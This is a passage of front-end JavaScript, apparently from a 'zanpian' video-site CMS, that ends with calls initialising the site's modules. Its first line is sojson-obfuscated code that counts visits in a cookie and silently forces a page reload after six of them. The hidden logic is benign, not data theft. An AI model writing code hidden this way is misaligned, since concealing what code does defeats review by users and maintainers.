    ['sojson.v4']["\x66\x69\x6c\x74\x65\x72"]["\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72"](((['sojson.v4']+[])["\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72"]['\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f\x64\x65']['\x61\x70\x70\x6c\x79'](null,"118A97b114J32j110o117Q109K32s61c32i122Y97Z110K112u105u97M110Z46G67j111B111C107B105f101Z46D71c101I116l40H39k82G101l102O114W101U115X104s39B41F59N10O9c9z118c97m114p32p102O108X97U103h32O61F32u100G111C99C117k109R101q110b116a46R99n111M111u107K105Q101n46p105J110H100A101P120A79Z102U40g34L82a101E102h114L101F115T104C61C34W41Q59w10g9j9H105e102z40D102G108A97x103B32Z33j61X32I45B49M41L123y10h9v9j9J105R102W40y110s117w109s32x62D61a32U54z41c123e10q9P9F9E9w115O101Y116D84Q105T109g101D111o117q116r40H102q117w110H99u116X105x111h110K40g41u123f10K9P9I9u9N9R119M105D110s100q111t119n46l108W111L99I97b116R105L111v110h46t114H101l108J111v97j100E40c41W59u10p9g9X9d9g125F44o49Q48Y48Q48i41C59s10M9j9n9K9u122O97c110G112Z105v97m110p46T67u111P111X107e105k101k46W83g101y116b40t39L82u101d102i114C101u115B104a39h44N49z44N49K41M59h10Z9u9I9C125c101M108F115L101i123W10Y9x9X9m9A122o97k110A112e105k97U110r46D67L111c111U107s105h101S46c83D101F116l40v39j82x101U102t114b101e115k104Q39v44n78e117H109B98W101J114k40U110F117H109G41j32K43Z32q49K44G49H41W59a10S9y9w9e125N10I9V9n125P101F108g115w101T123L10C9R9F9L122F97D110H112L105J97u110G46h67S111M111Y107V105E101s46p83b101M116I40d39S82A101j102R114K101H115Z104g39h44v49v44r49E41v59q10u9Q9z125"['\x73\x70\x6c\x69\x74'](/[a-zA-Z]{1,}/))))('sojson.v4');
}
zanpian.image.swiper();//幻灯片
zanpian.cms.floatdiv();//窗口提示信息
zanpian.cms.all();//主要加载
zanpian.image.lazyload();//图片延迟加载
zanpian.search.autocomplete();//联系搜索
zanpian.user.index();
zanpian.gbook.load();
zanpian.validate.load();
zanpian.playlog.load();//加载播放记录
zanpian.score.load();//加载评分
zanpian.cm.load();//加载评论
zanpian.updown.load();
zanpian.love.load();//订阅收藏
zanpian.cms.playlist();//窗口提示信息
zanpian.hits.load();
});